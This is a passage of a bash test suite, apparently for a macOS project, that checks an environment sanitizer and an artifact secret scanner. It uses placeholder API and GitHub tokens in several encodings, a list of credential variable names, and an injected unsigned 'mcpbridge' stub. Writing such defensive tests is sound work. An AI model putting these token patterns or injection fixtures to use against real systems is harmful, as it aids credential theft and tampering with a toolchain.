  kill -KILL "$wrapper"
  wrapper_status=0
  wait "$wrapper" || wrapper_status=$?
  [[ "$wrapper_status" == 137 ]] || return 1
  kill -0 -- "-$runtime_group"
  assert_xcodebuildmcp_lease_held "$old_run/lease"

  replacement="$("$copy/scripts/xcodebuildmcp.sh" --version 2>"$copy/.build/runtime-replacement.err")"
  [[ "$replacement" == "2.6.2" ]] || return 1
  [[ -d "$old_run" ]] || return 1
  assert_xcodebuildmcp_lease_held "$old_run/lease"

  kill -KILL -- "-$runtime_group" 2>/dev/null || true
  exec 7>&-
  for _attempt in {1..200}; do
    ! kill -0 -- "-$runtime_group" 2>/dev/null && break
    /bin/sleep 0.01
  done
  ! kill -0 -- "-$runtime_group" 2>/dev/null || return 1
  replacement="$("$copy/scripts/xcodebuildmcp.sh" --version 2>"$copy/.build/runtime-reap.err")"
  [[ "$replacement" == "2.6.2" ]] || return 1
  [[ ! -e "$old_run" ]] || return 1
  [[ "$(find "$copy/.build/xcodebuildmcp-runs" -mindepth 1 -maxdepth 1 -name 'run.*' | wc -l | tr -d ' ')" == "0" ]] || return 1
}

test_artifact_secret_boundary() {
  local batch_dir batch_log byte_dir child_pid clean_video clone_dir controller_dir controller_path copy credential_name developer_root export_count export_dir external fake_developer fake_scanner fallback_dir fixture_renderer github_sha known_github_token known_token log
  local capture_marker capture_release final_marker final_release hash_marker hash_release hash_timestamp mutation_dir mutation_marker mutation_release
  local ocr_marker ocr_release original_identity path_password persistent_cache privacy_pid privacy_status privacy_work scan_dir
  local cleanup_deadline live_members scanner_dir scanner_owner scanner_tmp secret_backup secret_evidence secret_name_path restored_identity
  local after_snapshot_artifacts before_snapshot_artifacts safe scan_status
  local secret_video sentinel snapshot_status unsafe unsafe_sanitizer video_dir video_fixture_renderer
  cleanup_privacy_interrupt_test() {
    local cleanup_members=0 cleanup_until group="${privacy_pid:-}"
    [[ -z "${ocr_release:-}" ]] || touch "$ocr_release"
    if [[ "$group" =~ ^[1-9][0-9]*$ ]]; then
      cleanup_members="$(
        /bin/ps -axo pgid=,stat= \
          | /usr/bin/awk -v expected="$group" \
            '$1 == expected && $2 !~ /^Z/ { count++ } END { print count + 0 }'
      )"
      [[ "$cleanup_members" -eq 0 ]] \
        || kill -TERM "-$group" 2>/dev/null \
        || true
      cleanup_until=$((SECONDS + 5))
      while [[ "$cleanup_members" -ne 0 && "$SECONDS" -lt "$cleanup_until" ]]; do
        cleanup_members="$(
          /bin/ps -axo pgid=,stat= \
            | /usr/bin/awk -v expected="$group" \
              '$1 == expected && $2 !~ /^Z/ { count++ } END { print count + 0 }'
        )"
        [[ "$cleanup_members" -eq 0 ]] || /bin/sleep 0.05
      done
      [[ "$cleanup_members" -eq 0 ]] \
        || kill -KILL "-$group" 2>/dev/null \
        || true
      cleanup_until=$((SECONDS + 5))
      while [[ "$cleanup_members" -ne 0 && "$SECONDS" -lt "$cleanup_until" ]]; do
        cleanup_members="$(
          /bin/ps -axo pgid=,stat= \
            | /usr/bin/awk -v expected="$group" \
              '$1 == expected && $2 !~ /^Z/ { count++ } END { print count + 0 }'
        )"
        [[ "$cleanup_members" -eq 0 ]] || /bin/sleep 0.05
      done
      [[ "$cleanup_members" -ne 0 ]] || wait "$group" 2>/dev/null || true
    fi
    cleanup_until=$((SECONDS + 10))
    while [[ -n "${scanner_tmp:-}" && -d "$scanner_tmp" \
      && "$SECONDS" -lt "$cleanup_until" ]]; do
      [[ -z "$(find "$scanner_tmp" -mindepth 1 -print -quit)" ]] && break
      /bin/sleep 0.05
    done
    [[ -z "${scanner_tmp:-}" || ! -d "$scanner_tmp" ]] \
      || rm -rf "$scanner_tmp"
    rm -f "${scanner_owner:-}" "${ocr_marker:-}"
  }
  copy="$(fixture artifact-secret-boundary)"
  copy="$(cd "$copy" && pwd -P)"
  safe="$copy/artifacts/secret-scan-safe"
  unsafe="$copy/artifacts/secret-scan-unsafe"
  log="$copy/artifacts/secret-scan.log"
  sentinel="SWIFTMAC_SECRET_BOUNDARY_$(uuidgen | tr -d '-')"
  mkdir -p "$safe" "$unsafe"
  developer_root="$(/usr/bin/xcode-select -p)"

  OPENAI_API_KEY="$sentinel" \
  GITHUB_PAT="$sentinel" \
  RUNWAYML_API_SECRET="$sentinel" \
  SSH_AUTH_SOCK="$sentinel" \
    "$copy/scripts/support/run_sanitized.sh" /usr/bin/env \
    >"$copy/artifacts/sanitized-environment.txt"
  ! grep -Fq "$sentinel" "$copy/artifacts/sanitized-environment.txt" || return 1
  grep -qx 'SSH_AUTH_SOCK=' "$copy/artifacts/sanitized-environment.txt"
  grep -q '^PATH=/usr/bin:/bin:/usr/sbin:/sbin$' "$copy/artifacts/sanitized-environment.txt"
  grep -qx "DEVELOPER_DIR=$(cd "$developer_root" && pwd -P)" \
    "$copy/artifacts/sanitized-environment.txt"

  DEVELOPER_DIR="$developer_root" \
    "$copy/scripts/support/run_sanitized.sh" /usr/bin/env \
    >"$copy/artifacts/validated-developer-environment.txt"
  grep -qx "DEVELOPER_DIR=$(cd "$developer_root" && pwd -P)" \
    "$copy/artifacts/validated-developer-environment.txt"
  if DEVELOPER_DIR="$copy" \
    "$copy/scripts/support/run_sanitized.sh" /usr/bin/env \
    >"$copy/artifacts/unsafe-developer-environment.txt" 2>&1; then
    echo "sanitized environment accepted an untrusted DEVELOPER_DIR" >&2
    return 1
  fi

  fake_developer="$copy/XcodeFixture.app/Contents/Developer"
  unsafe_sanitizer="$copy/artifacts/unsafe-sanitizer.sh"
  mkdir -p "$fake_developer/usr/bin"
  /bin/cp "$developer_root/usr/bin/xcodebuild" "$fake_developer/usr/bin/xcodebuild"
  printf '%s\n' '#!/bin/bash' 'echo injected-mcpbridge' >"$fake_developer/usr/bin/mcpbridge"
  chmod 755 "$fake_developer/usr/bin/xcodebuild" "$fake_developer/usr/bin/mcpbridge"
  /bin/cp "$copy/scripts/support/run_sanitized.sh" "$unsafe_sanitizer"
  /usr/bin/python3 -I - "$unsafe_sanitizer" "$fake_developer" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
developer = sys.argv[2]
path.write_text(path.read_text().replace(
    "/Applications/Xcode*.app/Contents/Developer",
    developer,
    1,
))
PY
  chmod 700 "$unsafe_sanitizer"
  if DEVELOPER_DIR="$fake_developer" "$unsafe_sanitizer" /usr/bin/env \
    >"$copy/artifacts/unsafe-mcpbridge-environment.txt" 2>&1; then
    echo "sanitized environment accepted an unsigned mcpbridge" >&2
    return 1
  fi
  grep -q 'mcpbridge signature verification failed' \
    "$copy/artifacts/unsafe-mcpbridge-environment.txt"

  printf 'ordinary artifact\n' >"$safe/result.txt"
  OPENAI_API_KEY="$sentinel" \
    "$copy/scripts/support/secret_scan.py" "$safe" >/dev/null

  github_sha="$(git -C "$copy" rev-parse HEAD)"
  printf '{"git_head":"%s","workspace":"%s"}\n' \
    "$github_sha" "$copy" >"$safe/ci-provenance.json"
  GITHUB_SHA="$github_sha" \
  GITHUB_WORKFLOW_SHA="$github_sha" \
  GITHUB_WORKSPACE="$copy" \
    "$copy/scripts/support/secret_scan.py" "$safe" >/dev/null

  printf '%s\n' \
    'https://github.com' \
    'https://api.github.com' \
    'https://api.github.com/graphql' >"$safe/public-github-urls.txt"
  GITHUB_SERVER_URL='https://github.com' \
  GITHUB_API_URL='https://api.github.com' \
  GITHUB_GRAPHQL_URL='https://api.github.com/graphql' \
    "$copy/scripts/support/secret_scan.py" "$safe" >/dev/null
  printf '%s\n' 'https://github.enterprise.invalid' >"$unsafe/private-github-url.txt"
  set +e
  GITHUB_SERVER_URL='https://github.enterprise.invalid' \
    "$copy/scripts/support/secret_scan.py" \
    "$unsafe/private-github-url.txt" >"$log" 2>&1
  scan_status=$?
  set -e
  [[ "$scan_status" -ne 0 ]] || return 1
  grep -q 'environment:GITHUB_SERVER_URL' "$log"
  ! grep -q 'github.enterprise.invalid' "$log" || return 1
  rm "$unsafe/private-github-url.txt"

  printf '%s' "$sentinel" >"$unsafe/github-credential.txt"
  for credential_name in GITHUB_TOKEN GH_TOKEN GITHUB_PAT GITHUB_KEY GH_KEY; do
    set +e
    env "$credential_name=$sentinel" \
      "$copy/scripts/support/secret_scan.py" "$unsafe/github-credential.txt" >"$log" 2>&1
    scan_status=$?
    set -e
    [[ "$scan_status" -ne 0 ]] || return 1
    grep -q "environment:$credential_name" "$log"
    ! grep -Fq "$sentinel" "$log" || return 1
  done

  known_github_token="github_pat_$(printf 'B%.0s' {1..32})"
  printf '%s' "$known_github_token" >"$unsafe/known-github-token.txt"
  if env -u GITHUB_TOKEN -u GH_TOKEN -u GITHUB_PAT \
    "$copy/scripts/support/secret_scan.py" \
    "$unsafe/known-github-token.txt" >"$log" 2>&1; then
    echo "known GitHub token bypassed the scanner" >&2
    return 1
  fi
  grep -q 'pattern:github-token' "$log"
  ! grep -Fq "$known_github_token" "$log" || return 1

  printf '%s' "$sentinel" | iconv -f UTF-8 -t UTF-16LE >"$unsafe/trace.bin"
  set +e
  OPENAI_API_KEY="$sentinel" \
    "$copy/scripts/support/secret_scan.py" "$unsafe" >"$log" 2>&1
  scan_status=$?
  set -e
  [[ "$scan_status" -ne 0 ]] || return 1
  grep -q 'environment:OPENAI_API_KEY' "$log"
  ! grep -Fq "$sentinel" "$log" || return 1

  printf '%s' "$sentinel" | base64 >"$unsafe/trace.bin"
  set +e
  PGPASSWORD="$sentinel" \
    "$copy/scripts/support/secret_scan.py" "$unsafe" >"$log" 2>&1
  scan_status=$?
  set -e
  [[ "$scan_status" -ne 0 ]] || return 1
  grep -q 'environment:PGPASSWORD' "$log"
  ! grep -Fq "$sentinel" "$log" || return 1

  printf '%s' "$sentinel" >"$safe/pineapple.txt"
  PINEAPPLE="$sentinel" \
    "$copy/scripts/support/secret_scan.py" "$safe" >/dev/null

  known_token="sk-proj-$(printf 'A%.0s' {1..32})"
  printf '%s' "$known_token" | iconv -f UTF-8 -t UTF-16LE >"$unsafe/known-utf16.bin"
  if env -u OPENAI_API_KEY "$copy/scripts/support/secret_scan.py" \
    "$unsafe/known-utf16.bin" >"$log" 2>&1; then
    echo "known UTF-16 token bypassed the scanner" >&2
    return 1
  fi
  grep -q 'encoded-pattern:openai-key' "$log"
  ! grep -Fq "$known_token" "$log" || return 1

  printf '%s' "$known_token" | base64 >"$unsafe/known-base64.txt"
  if env -u OPENAI_API_KEY "$copy/scripts/support/secret_scan.py" \
    "$unsafe/known-base64.txt" >"$log" 2>&1; then
    echo "known Base64 token bypassed the scanner" >&2
    return 1
  fi
  grep -q 'encoded-pattern:openai-key' "$log"

  printf '%s' "$known_token" | xxd -p -c 1000 >"$unsafe/known-hex.txt"
  if env -u OPENAI_API_KEY "$copy/scripts/support/secret_scan.py" \
    "$unsafe/known-hex.txt" >"$log" 2>&1; then
    echo "known hex token bypassed the scanner" >&2
    return 1
  fi
  grep -q 'encoded-pattern:openai-key' "$log"

  mkdir "$unsafe/unreadable"
  printf '%s' "$known_token" >"$unsafe/unreadable/value.bin"
  chmod 000 "$unsafe/unreadable"
  if "$copy/scripts/support/secret_scan.py" "$unsafe" >"$log" 2>&1; then
    echo "artifact scan silently skipped an unreadable directory" >&2
    return 1
  fi
  grep -q 'unreadable directory' "$log"
  chmod 700 "$unsafe/unreadable"

  local mise_output
  mise_output="$(
    OPENAI_API_KEY="$sentinel" \
      bash -c 'cd "$1"; . scripts/lib.sh; mise_exec /usr/bin/env' _ "$copy"
  )"
  if [[ "$mise_output" == *"$sentinel"* ]]; then
    echo "mise_exec inherited a credential sentinel" >&2
    return 1
  fi

  fixture_renderer="$copy/.build/render-ocr-fixture"
  mkdir -p "$(dirname "$fixture_renderer")"
  "$copy/scripts/support/run_sanitized.sh" /usr/bin/xcrun swiftc \
    -parse-as-library \
    -swift-version 6 \
    -O \
    -warnings-as-errors \
    -framework CoreGraphics \
    -framework CoreText \
    -framework ImageIO \
    "$copy/scripts/support/render_ocr_fixture.swift" \
    -o "$fixture_renderer"
  "$copy/scripts/support/run_sanitized.sh" "$fixture_renderer" clean "$safe/clean.png"
  for url_kind in server api graphql; do
    "$copy/scripts/support/run_sanitized.sh" \
      "$fixture_renderer" "public-github-$url_kind-url" \
      "$safe/public-github-$url_kind-url.png"
    "$copy/scripts/support/run_sanitized.sh" \
      "$fixture_renderer" "private-github-$url_kind-url" \
      "$unsafe/private-github-$url_kind-url.png"
  done
  "$copy/scripts/support/run_sanitized.sh" "$fixture_renderer" secret "$unsafe/secret.png"
  "$copy/scripts/support/secret_scan.py" "$unsafe/secret.png" >/dev/null
  GITHUB_SERVER_URL='https://github.com' \
  GITHUB_API_URL='https://api.github.com' \
  GITHUB_GRAPHQL_URL='https://api.github.com/graphql' \
    bash -c '. "$1/scripts/lib.sh"; shift; scan_artifacts "$@"' \
    _ "$copy" "$safe/public-github-server-url.png" \
    "$safe/public-github-api-url.png" \
    "$safe/public-github-graphql-url.png" >/dev/null
  set +e
  GITHUB_SERVER_URL='https://github.enterprise.invalid' \
  GITHUB_API_URL='https://api.github.enterprise.invalid' \
  GITHUB_GRAPHQL_URL='https://api.github.enterprise.invalid/graphql' \
    bash -c '. "$1/scripts/lib.sh"; shift; scan_artifacts "$@"' \
    _ "$copy" "$unsafe/private-github-server-url.png" \
    "$unsafe/private-github-api-url.png" \
    "$unsafe/private-github-graphql-url.png" >"$log" 2>&1
  scan_status=$?
  set -e
  [[ "$scan_status" -ne 0 ]] || return 1
  grep -q 'environment:GITHUB_SERVER_URL' "$log"
  grep -q 'environment:GITHUB_API_URL' "$log"
  grep -q 'environment:GITHUB_GRAPHQL_URL' "$log"
  ! grep -q 'github.enterprise.invalid' "$log" || return 1
  rm "$unsafe"/private-github-*-url.png

  /usr/bin/python3 -I - \
    "$copy/scripts/support/artifact_privacy_scan.py" \
    "$copy/scripts/support/visual_secret_scan.swift" <<'PY'
import pathlib
import sys

controller = pathlib.Path(sys.argv[1])
controller_text = controller.read_text().replace(
    "import tempfile\n",
    "import tempfile\nimport time\n",
    1,
).replace(
    "    files, topology, findings = listed_files(module, arguments)\n",
    "    files, topology, findings = listed_files(module, arguments)\n"
    "    marker = os.environ.get('SWIFTMAC_FINAL_LIST_MARKER')\n"
    "    release = os.environ.get('SWIFTMAC_FINAL_LIST_RELEASE')\n"
    "    if marker and release:\n"
    "        pathlib.Path(marker).touch()\n"
    "        while not pathlib.Path(release).is_file():\n"
    "            time.sleep(0.01)\n",
    1,
).replace(
    "            inventory.append(inventory_file(path))\n",
    "            inventory.append(inventory_file(path))\n"
    "            marker = os.environ.get('SWIFTMAC_FINAL_HASH_MARKER')\n"
    "            release = os.environ.get('SWIFTMAC_FINAL_HASH_RELEASE')\n"
    "            if len(inventory) == 1 and marker and release:\n"
    "                pathlib.Path(marker).touch()\n"
    "                while not pathlib.Path(release).is_file():\n"
    "                    time.sleep(0.01)\n",
    1,
).replace(
    "    if run_visual_batch(args.scanner, images, args.original_only) != 0:\n"
    "        return 1\n",
    "    marker = os.environ.get('SWIFTMAC_CAPTURE_MARKER')\n"
    "    release = os.environ.get('SWIFTMAC_CAPTURE_RELEASE')\n"
    "    if marker and release:\n"
    "        pathlib.Path(marker).touch()\n"
    "        while not pathlib.Path(release).is_file():\n"
    "            time.sleep(0.01)\n"
    "    if run_visual_batch(args.scanner, images, args.original_only) != 0:\n"
    "        return 1\n",
    1,
)
for marker in (
    "SWIFTMAC_CAPTURE_MARKER",
    "SWIFTMAC_FINAL_HASH_MARKER",
    "SWIFTMAC_FINAL_LIST_MARKER",
):
    if controller_text.count(marker) != 1:
        raise SystemExit(f"privacy controller test hook was not installed: {marker}")
controller.write_text(controller_text)

scanner = pathlib.Path(sys.argv[2])
scanner_text = scanner.read_text().replace(
    "        if blocked { Foundation.exit(1) }\n",
    "        if let marker = ProcessInfo.processInfo.environment[\"SWIFTMAC_OCR_MARKER\"],\n"
    "           let release = ProcessInfo.processInfo.environment[\"SWIFTMAC_OCR_RELEASE\"] {\n"
    "            _ = FileManager.default.createFile(atPath: marker, contents: Data())\n"
    "            while !FileManager.default.fileExists(atPath: release) {\n"
    "                try? await Task.sleep(for: .milliseconds(10))\n"
    "            }\n"
    "        }\n"
    "        if blocked { Foundation.exit(1) }\n",
    1,
)
if scanner_text.count("SWIFTMAC_OCR_MARKER") != 1:
    raise SystemExit("visual scanner test hook was not installed")
scanner.write_text(scanner_text)
PY

  scan_dir="$copy/artifacts/descriptor-scan"
  capture_marker="$copy/artifacts/descriptor-captured.marker"
  capture_release="$copy/artifacts/descriptor-captured.release"
  ocr_marker="$copy/artifacts/descriptor-ocr.marker"
  ocr_release="$copy/artifacts/descriptor-ocr.release"
  secret_evidence="$scan_dir/evidence.png"
  secret_backup="$copy/artifacts/descriptor-secret-backup.png"
  mkdir "$scan_dir"
  cp "$unsafe/secret.png" "$secret_evidence"
  original_identity="$(
    stat -f '%d:%i:%z:%m' "$secret_evidence"
    shasum -a 256 "$secret_evidence" | awk '{print $1}'
  )"
  OPENAI_API_KEY="$sentinel" \
  SWIFTMAC_CAPTURE_MARKER="$capture_marker" \
  SWIFTMAC_CAPTURE_RELEASE="$capture_release" \
  SWIFTMAC_OCR_MARKER="$ocr_marker" \
  SWIFTMAC_OCR_RELEASE="$ocr_release" \
    bash -c '. "$1/scripts/lib.sh"; scan_artifacts "$2"' \
    _ "$copy" "$secret_evidence" >"$log" 2>&1 &
  privacy_pid=$!
  if ! wait_for_process_marker "$capture_marker" "$privacy_pid"; then
    touch "$capture_release" "$ocr_release"
    kill -TERM "$privacy_pid" 2>/dev/null || true
    wait "$privacy_pid" 2>/dev/null || true
    echo "artifact privacy scan did not capture its input" >&2
    return 1
  fi
  mv "$secret_evidence" "$secret_backup"
  cp "$safe/clean.png" "$secret_evidence"
  touch "$capture_release"
  if ! wait_for_process_marker "$ocr_marker" "$privacy_pid"; then
    touch "$ocr_release"
    kill -TERM "$privacy_pid" 2>/dev/null || true
    wait "$privacy_pid" 2>/dev/null || true
    echo "artifact privacy scan did not complete descriptor OCR" >&2
    return 1
  fi
  rm "$secret_evidence"
  mv "$secret_backup" "$secret_evidence"
  restored_identity="$(
    stat -f '%d:%i:%z:%m' "$secret_evidence"
    shasum -a 256 "$secret_evidence" | awk '{print $1}'
  )"
  [[ "$original_identity" == "$restored_identity" ]] || return 1
  touch "$ocr_release"
  privacy_status=0
  wait "$privacy_pid" || privacy_status=$?
  [[ "$privacy_status" -ne 0 ]] || return 1
  grep -q 'pattern:openai-key' "$log"
  ! grep -Fq "$sentinel" "$log" || return 1

  rm -rf "$scan_dir" "$capture_marker" "$capture_release" "$ocr_marker" "$ocr_release"
  mutation_dir="$copy/artifacts/tree-mutation-scan"
  mutation_marker="$copy/artifacts/tree-mutation-ocr.marker"
  mutation_release="$copy/artifacts/tree-mutation-ocr.release"
  mkdir "$mutation_dir"
  cp "$safe/clean.png" "$mutation_dir/clean.png"
  SWIFTMAC_OCR_MARKER="$mutation_marker" \
  SWIFTMAC_OCR_RELEASE="$mutation_release" \
    bash -c '. "$1/scripts/lib.sh"; scan_artifacts "$2"' \
    _ "$copy" "$mutation_dir" >"$log" 2>&1 &
  privacy_pid=$!
  if ! wait_for_process_marker "$mutation_marker" "$privacy_pid"; then
    touch "$mutation_release"
    kill -TERM "$privacy_pid" 2>/dev/null || true
    wait "$privacy_pid" 2>/dev/null || true
    echo "artifact privacy scan did not reach its mutation phase" >&2
    return 1
  fi
  mkdir -p "$mutation_dir/late/empty"
  touch "$mutation_release"
  privacy_status=0
  wait "$privacy_pid" || privacy_status=$?
  [[ "$privacy_status" -ne 0 ]] || return 1
  grep -q 'artifact inventory changed during privacy scan' "$log"
  ! grep -Fq "$sentinel" "$log" || return 1

  rm -rf "$mutation_dir" "$mutation_marker" "$mutation_release"
  mutation_marker="$copy/artifacts/file-mutation-ocr.marker"
  mutation_release="$copy/artifacts/file-mutation-ocr.release"
  mkdir "$mutation_dir"
  cp "$safe/clean.png" "$mutation_dir/clean.png"
  SWIFTMAC_OCR_MARKER="$mutation_marker" \
  SWIFTMAC_OCR_RELEASE="$mutation_release" \
    bash -c '. "$1/scripts/lib.sh"; scan_artifacts "$2"' \
    _ "$copy" "$mutation_dir" >"$log" 2>&1 &
  privacy_pid=$!
  if ! wait_for_process_marker "$mutation_marker" "$privacy_pid"; then
    touch "$mutation_release"
    kill -TERM "$privacy_pid" 2>/dev/null || true
    wait "$privacy_pid" 2>/dev/null || true
    echo "artifact privacy scan did not reach its file-mutation phase" >&2
    return 1
  fi
  printf '%s' "$sentinel" >"$mutation_dir/late-value.txt"
  touch "$mutation_release"
  privacy_status=0
  wait "$privacy_pid" || privacy_status=$?
  [[ "$privacy_status" -ne 0 ]] || return 1
  grep -q 'artifact inventory changed during privacy scan' "$log"
  ! grep -Fq "$sentinel" "$log" || return 1
  rm -rf "$mutation_dir" "$mutation_marker" "$mutation_release"

  final_marker="$copy/artifacts/final-list.marker"
  final_release="$copy/artifacts/final-list.release"
  mkdir "$mutation_dir"
  cp "$safe/clean.png" "$mutation_dir/clean.png"
  SWIFTMAC_FINAL_LIST_MARKER="$final_marker" \
  SWIFTMAC_FINAL_LIST_RELEASE="$final_release" \
    bash -c '. "$1/scripts/lib.sh"; scan_artifacts "$2"' \
    _ "$copy" "$mutation_dir" >"$log" 2>&1 &
  privacy_pid=$!
  if ! wait_for_process_marker "$final_marker" "$privacy_pid"; then
    touch "$final_release"
    kill -TERM "$privacy_pid" 2>/dev/null || true
    wait "$privacy_pid" 2>/dev/null || true
    echo "artifact privacy scan did not reach final enumeration" >&2
    return 1
  fi
  printf '%s' "$sentinel" >"$mutation_dir/late-value.txt"
  touch "$final_release"
  privacy_status=0
  wait "$privacy_pid" || privacy_status=$?
  [[ "$privacy_status" -ne 0 ]] || return 1
  grep -q 'artifact inventory changed during privacy scan' "$log"
  ! grep -Fq "$sentinel" "$log" || return 1
  rm -rf "$mutation_dir" "$final_marker" "$final_release"

  hash_marker="$copy/artifacts/final-hash.marker"
  hash_release="$copy/artifacts/final-hash.release"
  mkdir "$mutation_dir"
  printf '%*s' "${#known_token}" '' | tr ' ' 'A' >"$mutation_dir/a.txt"
  hash_timestamp="$(/usr/bin/python3 -I - "$mutation_dir/a.txt" <<'PY'
import pathlib
import sys

metadata = pathlib.Path(sys.argv[1]).stat()
print(f"{metadata.st_atime_ns}:{metadata.st_mtime_ns}")
PY
)"
  cp "$safe/clean.png" "$mutation_dir/z.png"
  SWIFTMAC_FINAL_HASH_MARKER="$hash_marker" \
  SWIFTMAC_FINAL_HASH_RELEASE="$hash_release" \
    bash -c '. "$1/scripts/lib.sh"; scan_artifacts "$2"' \
    _ "$copy" "$mutation_dir" >"$log" 2>&1 &
  privacy_pid=$!
  if ! wait_for_process_marker "$hash_marker" "$privacy_pid"; then
    touch "$hash_release"
    kill -TERM "$privacy_pid" 2>/dev/null || true
    wait "$privacy_pid" 2>/dev/null || true
    echo "artifact privacy scan did not reach final hashing" >&2
    return 1
  fi
  printf '%s' "$known_token" >"$mutation_dir/a.txt"
  /usr/bin/python3 -I - "$mutation_dir/a.txt" "$hash_timestamp" <<'PY'
import os
import sys

accessed, modified = (int(value) for value in sys.argv[2].split(":"))
os.utime(sys.argv[1], ns=(accessed, modified))
PY
  touch "$hash_release"
  privacy_status=0
  wait "$privacy_pid" || privacy_status=$?
  [[ "$privacy_status" -ne 0 ]] || return 1
  grep -q 'artifact inventory changed during privacy scan' "$log"
  ! grep -Fq "$known_token" "$log" || return 1
  rm -rf "$mutation_dir" "$hash_marker" "$hash_release"

  batch_dir="$copy/artifacts/privacy-batches"
  batch_log="$copy/artifacts/privacy-batches.log"
  fake_scanner="$copy/artifacts/privacy-fake-scanner"
  privacy_work="$copy/artifacts/privacy-work"
  mkdir "$batch_dir"
  mkdir -m 700 "$privacy_work"
  for batch_index in {1..65}; do
    cp "$safe/clean.png" "$batch_dir/clean-$batch_index.png"
  done
  cat >"$fake_scanner" <<'EOF'
#!/bin/bash -p
set -euo pipefail
[[ "${1:-}" != "--original-only" ]] || shift
count=0
while [[ "$#" -gt 0 ]]; do
  [[ "$#" -ge 3 && "$1" == "--input-fd" && "$2" =~ ^[0-9]+$ ]] || exit 2
  [[ "$(/usr/bin/xxd -p -l 8 "/dev/fd/$2")" == "89504e470d0a1a0a" ]] || exit 2
  count=$((count + 1))
  shift 3
done
printf '%s %s\n' "$count" "$(ls -1 /dev/fd | wc -l | tr -d ' ')" >>"$SWIFTMAC_BATCH_LOG"
printf '%s\n' 'visual secret scan: clean'
EOF
  chmod 500 "$fake_scanner"
  SWIFTMAC_BATCH_LOG="$batch_log" \
    /bin/bash -c '
      ulimit -n 48
      exec /usr/bin/python3 -I "$1" --scanner "$2" --work "$3" -- "$4"
    ' _ "$copy/scripts/support/artifact_privacy_scan.py" \
    "$fake_scanner" "$privacy_work" "$batch_dir" >/dev/null
  [[ "$(awk '{print $1}' "$batch_log" | paste -sd, -)" == "32,32,1" ]] || return 1
  awk '$2 > 44 { exit 1 }' "$batch_log" || return 1

  controller_dir="$copy/artifacts/privacy-controller-limits"
  controller_path="$controller_dir/artifact_privacy_scan.py"
  mkdir "$controller_dir"
  mkdir -m 700 "$controller_dir/work"
  cp "$copy/scripts/support/artifact_privacy_scan.py" "$controller_path"
  cp "$copy/scripts/support/secret_scan.py" "$controller_dir/secret_scan.py"
  byte_dir="$controller_dir/byte-input"
  mkdir "$byte_dir"
  for batch_index in {1..5}; do
    cp "$safe/clean.png" "$byte_dir/clean-$batch_index.png"
  done
  /usr/bin/python3 -I - "$controller_path" "$safe/clean.png" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
batch_bytes = pathlib.Path(sys.argv[2]).stat().st_size * 2
path.write_text(path.read_text().replace(
    "VISUAL_BATCH_BYTES = 256 * 1024 * 1024",
    f"VISUAL_BATCH_BYTES = {batch_bytes}",
    1,
))
PY
  rm -f "$batch_log"
  SWIFTMAC_BATCH_LOG="$batch_log" \
    /usr/bin/python3 -I "$controller_path" \
    --scanner "$fake_scanner" --work "$controller_dir/work" \
    -- "$byte_dir" >/dev/null
  [[ "$(awk '{print $1}' "$batch_log" | paste -sd, -)" == "2,2,1" ]] || return 1

  clone_dir="$controller_dir/clone-required"
  mkdir "$clone_dir"
  mkdir -m 700 "$clone_dir/work"
  cp "$copy/scripts/support/artifact_privacy_scan.py" "$clone_dir/controller.py"
  cp "$copy/scripts/support/secret_scan.py" "$clone_dir/secret_scan.py"
  /usr/bin/python3 -I - "$clone_dir/controller.py" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
path.write_text(path.read_text().replace(
    "    staged = tempfile.TemporaryFile(mode=\"w+b\", dir=work_path)\n",
    "    raise OSError('streaming fallback was unexpectedly used')\n",
    1,
))
PY
  rm -f "$batch_log"
  SWIFTMAC_BATCH_LOG="$batch_log" \
    /usr/bin/python3 -I "$clone_dir/controller.py" \
    --scanner "$fake_scanner" --work "$clone_dir/work" \
    -- "$safe/clean.png" >/dev/null
  [[ "$(awk '{print $1}' "$batch_log")" == "1" ]] || return 1

  fallback_dir="$controller_dir/streaming-fallback"
  mkdir "$fallback_dir"
  mkdir -m 700 "$fallback_dir/work"
  cp "$copy/scripts/support/artifact_privacy_scan.py" "$fallback_dir/controller.py"
  cp "$copy/scripts/support/secret_scan.py" "$fallback_dir/secret_scan.py"
  /usr/bin/python3 -I - "$fallback_dir/controller.py" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
path.write_text(path.read_text().replace(
    "FCLONEFILEAT = getattr(LIBC, \"fclonefileat\", None)",
    "FCLONEFILEAT = None",
    1,
))
PY
  rm -f "$batch_log"
  SWIFTMAC_BATCH_LOG="$batch_log" \
    /usr/bin/python3 -I "$fallback_dir/controller.py" \
    --scanner "$fake_scanner" --work "$fallback_dir/work" \
    -- "$safe/clean.png" >/dev/null
  [[ "$(awk '{print $1}' "$batch_log")" == "1" ]] || return 1

  /usr/bin/python3 -I - "$controller_path" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
path.write_text(path.read_text().replace(
    "VISUAL_FILE_BYTES = 256 * 1024 * 1024",
    "VISUAL_FILE_BYTES = 16",
    1,
).replace(
    "MAX_ARTIFACT_ENTRIES = 100_000",
    "MAX_ARTIFACT_ENTRIES = 2",
    1,
))
PY
  mkdir "$controller_dir/count"
  mkdir "$controller_dir/count/one"
  mkdir "$controller_dir/count/two"
  mkdir "$controller_dir/count/three"
  rm -f "$batch_log"
  if SWIFTMAC_BATCH_LOG="$batch_log" \
    /usr/bin/python3 -I "$controller_path" \
    --scanner "$fake_scanner" --work "$controller_dir/work" \
    -- "$controller_dir/count" >"$log" 2>&1; then
    echo "artifact privacy scan accepted more than its entry-count limit" >&2
    return 1
  fi
  grep -q 'artifact entry-count limit exceeded' "$log"
  [[ ! -e "$batch_log" ]] || return 1
  printf 'one\n' >"$controller_dir/one.txt"
  printf 'two\n' >"$controller_dir/two.txt"
  printf 'three\n' >"$controller_dir/three.txt"
  if SWIFTMAC_BATCH_LOG="$batch_log" \
    /usr/bin/python3 -I "$controller_path" \
    --scanner "$fake_scanner" --work "$controller_dir/work" -- \
    "$controller_dir/one.txt" "$controller_dir/two.txt" \
    "$controller_dir/three.txt" >"$log" 2>&1; then
    echo "artifact privacy scan accepted a cross-input entry-count overflow" >&2
    return 1
  fi
  grep -q 'artifact entry-count limit exceeded' "$log"
  [[ ! -e "$batch_log" ]] || return 1
  if SWIFTMAC_BATCH_LOG="$batch_log" \
    /usr/bin/python3 -I "$controller_path" \
    --scanner "$fake_scanner" --work "$controller_dir/work" \
    -- "$safe/clean.png" >"$log" 2>&1; then
    echo "artifact privacy scan accepted an oversized visual input" >&2
    return 1
  fi
